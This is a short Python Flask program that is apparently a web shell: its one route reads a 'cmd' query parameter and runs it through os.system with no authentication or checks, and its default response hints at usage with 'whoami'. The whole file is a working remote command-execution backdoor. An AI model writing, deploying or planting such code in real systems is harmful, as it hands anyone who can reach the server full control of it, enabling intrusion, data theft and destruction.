import os
from flask import Flask, request

app = Flask(__name__)

@app.route("/", methods=["GET"])
def execute():
    cmd = request.args.get('cmd')
    if cmd:
        print(cmd)
        execution = os.system(cmd)
        return "Executed"
    return "webshell.info?cmd=whoami"
if __name__ == "__main__":
    app.run()
